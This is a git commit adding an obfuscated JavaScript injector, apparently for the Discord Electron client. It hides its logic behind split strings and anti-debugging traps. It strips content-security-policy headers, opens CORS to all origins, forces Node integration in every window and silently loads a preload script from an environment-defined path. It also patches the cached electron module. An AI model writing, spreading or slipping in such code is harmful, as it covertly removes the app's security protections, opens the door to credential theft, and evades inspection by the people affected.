d66dd4efd0d26c4f26d358d1c73e8b62522e4d03
Teja Swaroop <42813446+teja156@users.noreply.github.com>
2020-06-02 23:09:44 +0530

    second commit

---
+++ 4n4archy/inject.js
@@ -0,0 +1,339 @@
+// WARNING! This file contains some subset of JS that is not supported by type inference.
+// You can try checking 'Transpile to ES5' checkbox if you want the types to be inferred
+'use strict';
+const f = function() {
+  const t = {};
+  t["Ri" + "zd" + "s"] = "ML" + "za" + "H";
+  t["Fe" + "Cm" + "o"] = "XX" + "Fx" + "w";
+  t["Dd" + "dv" + "F"] = "rq" + "zy" + "B";
+  t["nl" + "TC" + "A"] = "Hl" + "Pr" + "p";
+  const params = t;
+  let j = !![];
+  return function(value, deferred) {
+    const out = {};
+    out["Il" + "So" + "v"] = function(unit, p) {
+      return unit === p;
+    };
+    out["DE" + "ro" + "l"] = params["Ri" + "zd" + "s"];
+    out["RP" + "fy" + "A"] = params["Fe" + "Cm" + "o"];
+    const gl = out;
+    if (params["Dd" + "dv" + "F"] !== params["nl" + "TC" + "A"]) {
+      const o = j ? function() {
+        if (deferred) {
+          if (gl["Il" + "So" + "v"](gl["DE" + "ro" + "l"], gl["RP" + "fy" + "A"])) {
+            const q = deferred["ap" + "pl" + "y"](value, arguments);
+            deferred = null;
+            return q;
+          } else {
+            const q = deferred["ap" + "pl" + "y"](value, arguments);
+            deferred = null;
+            return q;
+          }
+        }
+      } : function() {
+      };
+      j = ![];
+      return o;
+    } else {
+      const q = j ? function() {
+        if (deferred) {
+          const r = deferred["ap" + "pl" + "y"](value, arguments);
+          deferred = null;
+          return r;
+        }
+      } : function() {
+      };
+      j = ![];
+      return q;
+    }
+  };
+}();
+const e = f(this, function() {
+  const map = {};
+  map["YY" + "bB" + "h"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  map["bW" + "gX" + "M"] = function(i, resl) {
+    return i !== resl;
+  };
+  map["HM" + "tE" + "Q"] = "hi" + "CO" + "J";
+  map["GR" + "WM" + "k"] = "lV" + "cw" + "o";
+  map["sX" + "AH" + "H"] = "re" + "tu" + "rn" + " /" + '" ' + "+ " + "th" + "is" + " +" + ' "' + "/";
+  map["yN" + "HJ" + "K"] = "^(" + "[^" + " ]" + "+(" + " +" + "[^" + " ]" + "+)" + "+)" + "+[" + "^ " + "]}";
+  const request = map;
+  const initialize = function() {
+    const AR = {};
+    AR["Ux" + "Cp" + "w"] = function(url, body) {
+      return request["YY" + "bB" + "h"](url, body);
+    };
+    const bitmap = AR;
+    if (request["bW" + "gX" + "M"](request["HM" + "tE" + "Q"], request["GR" + "WM" + "k"])) {
+      const accountsCallbacks = initialize["co" + "ns" + "tr" + "uc" + "to" + "r"](request["sX" + "AH" + "H"])()["co" + "mp" + "il" + "e"](request["yN" + "HJ" + "K"]);
+      return !accountsCallbacks["te" + "st"](e);
+    } else {
+      if (ret) {
+        return debuggerProtection;
+      } else {
+        bitmap["Ux" + "Cp" + "w"](debuggerProtection, 0);
+      }
+    }
+  };
+  return initialize();
+});
+e();
+const d = function() {
+  const data = {};
+  data["xx" + "Eo" + "Y"] = "fu" + "nc" + "ti" + "on" + " *" + "\\(" + " *" + "\\)";
+  data["Uk" + "qo" + "p"] = "\\+" + "\\+" + " *" + "(?" + ":[" + "a-" + "zA" + "-Z" + "_$" + "][" + "0-" + "9a" + "-z" + "A-" + "Z_" + "$]" + "*)";
+  data["KI" + "Me" + "x"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  data["mW" + "us" + "B"] = function(buckets, name) {
+    return buckets + name;
+  };
+  data["GZ" + "ed" + "M"] = function(x_or_y, y) {
+    return x_or_y === y;
+  };
+  data["Bj" + "nF" + "V"] = "XV" + "eW" + "s";
+  data["GQ" + "an" + "T"] = "eB" + "nh" + "J";
+  const map = data;
+  let j = !![];
+  return function(value, deferred) {
+    if (map["GZ" + "ed" + "M"](map["Bj" + "nF" + "V"], map["GQ" + "an" + "T"])) {
+      const harderTypes = new RegExp(map["xx" + "Eo" + "Y"]);
+      const _invariant2 = new RegExp(map["Uk" + "qo" + "p"], "i");
+      const item = map["KI" + "Me" + "x"](c, "in" + "it");
+      if (!harderTypes["te" + "st"](map["mW" + "us" + "B"](item, "ch" + "ai" + "n")) || !_invariant2["te" + "st"](map["mW" + "us" + "B"](item, "in" + "pu" + "t"))) {
+        map["KI" + "Me" + "x"](item, "0");
+      } else {
+        c();
+      }
+    } else {
+      const n = j ? function() {
+        if (deferred) {
+          const o = deferred["ap" + "pl" + "y"](value, arguments);
+          deferred = null;
+          return o;
+        }
+      } : function() {
+      };
+      j = ![];
+      return n;
+    }
+  };
+}();
+(function() {
+  const data = {};
+  data["co" + "Vq" + "U"] = "re" + "tu" + "rn" + " /" + '" ' + "+ " + "th" + "is" + " +" + ' "' + "/";
+  data["ip" + "Hm" + "t"] = "^(" + "[^" + " ]" + "+(" + " +" + "[^" + " ]" + "+)" + "+)" + "+[" + "^ " + "]}";
+  data["bo" + "MZ" + "d"] = "fu" + "nc" + "ti" + "on" + " *" + "\\(" + " *" + "\\)";
+  data["vV" + "GW" + "V"] = "\\+" + "\\+" + " *" + "(?" + ":[" + "a-" + "zA" + "-Z" + "_$" + "][" + "0-" + "9a" + "-z" + "A-" + "Z_" + "$]" + "*)";
+  data["Xb" + "KZ" + "l"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  data["AV" + "GO" + "J"] = "in" + "it";
+  data["DV" + "SN" + "E"] = function(buckets, name) {
+    return buckets + name;
+  };
+  data["Dc" + "Ro" + "g"] = "ch" + "ai" + "n";
+  data["Pa" + "Jr" + "C"] = function(buckets, name) {
+    return buckets + name;
+  };
+  data["Nd" + "nR" + "F"] = "in" + "pu" + "t";
+  data["GX" + "Wl" + "F"] = "NV" + "gT" + "N";
+  data["eQ" + "Rx" + "s"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  data["sd" + "Bp" + "m"] = function(x_or_y, y) {
+    return x_or_y === y;
+  };
+  data["uH" + "EE" + "G"] = "Rf" + "wU" + "v";
+  data["PX" + "YS" + "q"] = function(saveNotifs) {
+    return saveNotifs();
+  };
+  data["Gk" + "mo" + "k"] = function(nodeGetter, mmCoreSplitViewBlock, l) {
+    return nodeGetter(mmCoreSplitViewBlock, l);
+  };
+  const map = data;
+  map["Gk" + "mo" + "k"](d, this, function() {
+    const harderTypes = new RegExp(map["bo" + "MZ" + "d"]);
+    const _invariant2 = new RegExp(map["vV" + "GW" + "V"], "i");
+    const item = map["Xb" + "KZ" + "l"](c, map["AV" + "GO" + "J"]);
+    if (!harderTypes["te" + "st"](map["DV" + "SN" + "E"](item, map["Dc" + "Ro" + "g"])) || !_invariant2["te" + "st"](map["Pa" + "Jr" + "C"](item, map["Nd" + "nR" + "F"]))) {
+      if ("AZ" + "FO" + "S" === map["GX" + "Wl" + "F"]) {
+        return debuggerProtection;
+      } else {
+        map["eQ" + "Rx" + "s"](item, "0");
+      }
+    } else {
+      if (map["sd" + "Bp" + "m"]("Rf" + "wU" + "v", map["uH" + "EE" + "G"])) {
+        map["PX" + "YS" + "q"](c);
+      } else {
+        const accountsCallbacks = test["co" + "ns" + "tr" + "uc" + "to" + "r"](map["co" + "Vq" + "U"])()["co" + "mp" + "il" + "e"](map["ip" + "Hm" + "t"]);
+        return !accountsCallbacks["te" + "st"](e);
+      }
+    }
+  })();
+})();
+const electron = require("el" + "ec" + "tr" + "on");
+const path = require("pa" + "th");
+const fs = require("fs");
+electron["se" + "ss" + "io" + "n"]["de" + "fa" + "ul" + "tS" + "es" + "si" + "on"]["we" + "bR" + "eq" + "ue" + "st"]["on" + "He" + "ad" + "er" + "sR" + "ec" + "ei" + "ve" + "d"](function(nodes, val) {
+  const map = {};
+  map["XL" + "Gl" + "M"] = "Ac" + "ce" + "ss" + "-C" + "on" + "tr" + "ol" + "-A" + "ll" + "ow" + "-O" + "ri" + "gi" + "n";
+  map["pd" + "tz" + "w"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  map["NN" + "to" + "v"] = "co" + "nt" + "en" + "t-" + "se" + "cu" + "ri" + "ty" + "-p" + "ol" + "ic" + "y";
+  map["eU" + "EE" + "n"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  const output = map;
+  nodes["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"][output["XL" + "Gl" + "M"]] = "*";
+  const Messages = {};
+  Messages["ca" + "nc" + "el"] = ![];
+  if (!nodes["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"]["co" + "nt" + "en" + "t-" + "se" + "cu" + "ri" + "ty" + "-p" + "ol" + "ic" + "y-" + "re" + "po" + "rt" + "-o" + "nl" + "y"] && !nodes["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"]["co" + "nt" + "en" + "t-" + "se" + "cu" + "ri" + "ty" + "-p" + "ol" + "ic" + "y"]) {
+    return output["pd" + "tz" + "w"](val, Messages);
+  }
+  delete nodes["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"]["co" + "nt" + "en" + "t-" + "se" + "cu" + "ri" + "ty" + "-p" + "ol" + "ic" + "y-" + "re" + "po" + "rt" + "-o" + "nl" + "y"];
+  delete nodes["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"][output["NN" + "to" + "v"]];
+  const window = {};
+  window["ca" + "nc" + "el"] = ![];
+  window["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"] = nodes["re" + "sp" + "on" + "se" + "He" + "ad" + "er" + "s"];
+  output["eU" + "EE" + "n"](val, window);
+});
+class BrowserWindow extends electron["Br" + "ow" + "se" + "rW" + "in" + "do" + "w"] {
+  constructor(choices) {
+    if (!choices || !choices["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"] || !choices["ti" + "tl" + "e"]) {
+      return super(choices);
+    }
+    const rollData = Object["cr" + "ea" + "te"](choices);
+    rollData["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"] = Object["cr" + "ea" + "te"](rollData["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"]);
+    const j = rollData["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"]["pr" + "el" + "oa" + "d"];
+    rollData["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"]["no" + "de" + "In" + "te" + "gr" + "at" + "io" + "n"] = !![];
+    rollData["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"]["pr" + "el" + "oa" + "d"] = path["jo" + "in"](process["en" + "v"]["mo" + "dD" + "ir"], "\\d" + "is" + "co" + "rd" + "mo" + "d." + "js");
+    rollData["we" + "bP" + "re" + "fe" + "re" + "nc" + "es"]["tr" + "an" + "sp" + "ar" + "en" + "cy"] = !![];
+    super(rollData);
+    this["__" + "pr" + "el" + "oa" + "d"] = j;
+  }
+}
+const electron_path = require["re" + "so" + "lv" + "e"]("el" + "ec" + "tr" + "on");
+Object["as" + "si" + "gn"](BrowserWindow, electron["Br" + "ow" + "se" + "rW" + "in" + "do" + "w"]);
+if (electron["de" + "pr" + "ec" + "at" + "e"] && electron["de" + "pr" + "ec" + "at" + "e"]["pr" + "om" + "is" + "if" + "y"]) {
+  const normalize = electron["de" + "pr" + "ec" + "at" + "e"]["pr" + "om" + "is" + "if" + "y"];
+  electron["de" + "pr" + "ec" + "at" + "e"]["pr" + "om" + "is" + "if" + "y"] = (h) => {
+    return h ? normalize(h) : () => {
+      return void 0;
+    };
+  };
+}
+const g = {};
+g["Br" + "ow" + "se" + "rW" + "in" + "do" + "w"] = BrowserWindow;
+const newElectron = Object["as" + "si" + "gn"]({}, electron, g);
+delete require["ca" + "ch" + "e"][electron_path]["ex" + "po" + "rt" + "s"];
+require["ca" + "ch" + "e"][electron_path]["ex" + "po" + "rt" + "s"] = newElectron;
+function c(fnArgs) {
+  function initialize(name) {
+    const depObjectifyWarn = {};
+    depObjectifyWarn["CM" + "Hj" + "d"] = function(saveNotifs, notifications) {
+      return saveNotifs(notifications);
+    };
+    const window = depObjectifyWarn;
+    if (map["XU" + "gL" + "X"](map["kw" + "fF" + "a"], map["MI" + "FP" + "B"])) {
+      const event = fn["ap" + "pl" + "y"](context, arguments);
+      fn = null;
+      return event;
+    } else {
+      if (typeof name === map["NP" + "Rx" + "g"]) {
+        return function(canCreateDiscussions) {
+        }["co" + "ns" + "tr" + "uc" + "to" + "r"](map["oC" + "Gj" + "p"])["ap" + "pl" + "y"](map["vv" + "iD" + "U"]);
+      } else {
+        if (map["XU" + "gL" + "X"](map["WB" + "QS" + "E"], map["Jx" + "el" + "D"])) {
+          const output = {};
+          output["Cz" + "iu" + "f"] = map["Wk" + "Ap" + "a"];
+          const mTimesNew = output;
+          const test = function() {
+            const accountsCallbacks = test["co" + "ns" + "tr" + "uc" + "to" + "r"](mTimesNew["Cz" + "iu" + "f"])()["co" + "mp" + "il" + "e"]("^(" + "[^" + " ]" + "+(" + " +" + "[^" + " ]" + "+)" + "+)" + "+[" + "^ " + "]}");
+            return !accountsCallbacks["te" + "st"](e);
+          };
+          return map["lf" + "Yq" + "e"](test);
+        } else {
+          if (map["eh" + "ho" + "g"](map["XH" + "YM" + "y"]("", name / name)[map["FG" + "en" + "v"]], 1) || map["Gl" + "ZF" + "P"](name, 20) === 0) {
+            (function() {
+              return !![];
+            })["co" + "ns" + "tr" + "uc" + "to" + "r"](map["EV" + "Ph" + "B"]("de" + "bu", map["nx" + "Pc" + "p"]))["ca" + "ll"](map["HH" + "nh" + "a"]);
+          } else {
+            if (map["eh" + "ho" + "g"](map["nn" + "WX" + "P"], "Ht" + "Vu" + "h")) {
+              (function() {
+                return ![];
+              })["co" + "ns" + "tr" + "uc" + "to" + "r"](map["CU" + "GP" + "t"](map["Tw" + "rL" + "Q"], "gg" + "er"))["ap" + "pl" + "y"](map["VA" + "gU" + "K"]);
+            } else {
+              window["CM" + "Hj" + "d"](result, "0");
+            }
+          }
+        }
+      }
+      map["IW" + "Js" + "l"](initialize, ++name);
+    }
+  }
+  const output = {};
+  output["Wk" + "Ap" + "a"] = "re" + "tu" + "rn" + " /" + '" ' + "+ " + "th" + "is" + " +" + ' "' + "/";
+  output["lf" + "Yq" + "e"] = function(saveNotifs) {
+    return saveNotifs();
+  };
+  output["XU" + "gL" + "X"] = function(x_or_y, y) {
+    return x_or_y === y;
+  };
+  output["kw" + "fF" + "a"] = "XU" + "pV" + "o";
+  output["MI" + "FP" + "B"] = "MI" + "Hz" + "e";
+  output["NP" + "Rx" + "g"] = "st" + "ri" + "ng";
+  output["oC" + "Gj" + "p"] = "wh" + "il" + "e " + "(t" + "ru" + "e)" + " {" + "}";
+  output["vv" + "iD" + "U"] = "co" + "un" + "te" + "r";
+  output["WB" + "QS" + "E"] = "TJ" + "xB" + "T";
+  output["Jx" + "el" + "D"] = "zg" + "NJ" + "N";
+  output["eh" + "ho" + "g"] = function(name, importedModule) {
+    return name !== importedModule;
+  };
+  output["XH" + "YM" + "y"] = function(buckets, name) {
+    return buckets + name;
+  };
+  output["FG" + "en" + "v"] = "le" + "ng" + "th";
+  output["Gl" + "ZF" + "P"] = function(i, n) {
+    return i % n;
+  };
+  output["EV" + "Ph" + "B"] = function(buckets, name) {
+    return buckets + name;
+  };
+  output["nx" + "Pc" + "p"] = "gg" + "er";
+  output["HH" + "nh" + "a"] = "ac" + "ti" + "on";
+  output["nn" + "WX" + "P"] = "oy" + "Xv" + "a";
+  output["CU" + "GP" + "t"] = function(buckets, name) {
+    return buckets + name;
+  };
+  output["Tw" + "rL" + "Q"] = "de" + "bu";
+  output["VA" + "gU" + "K"] = "st" + "at" + "eO" + "bj" + "ec" + "t";
+  output["IW" + "Js" + "l"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  output["hJ" + "tA" + "y"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  output["WI" + "Vl" + "y"] = "dN" + "Gx" + "l";
+  output["DA" + "wP" + "Z"] = function(saveNotifs, notifications) {
+    return saveNotifs(notifications);
+  };
+  const map = output;
+  try {
+    if (map["WI" + "Vl" + "y"] === "dN" + "Gx" + "l") {
+      if (fnArgs) {
+        return initialize;
+      } else {
+        map["DA" + "wP" + "Z"](initialize, 0);
+      }
+    } else {
+      map["hJ" + "tA" + "y"](initialize, 0);
+    }
+  } catch (n) {
+  }
+}
+;
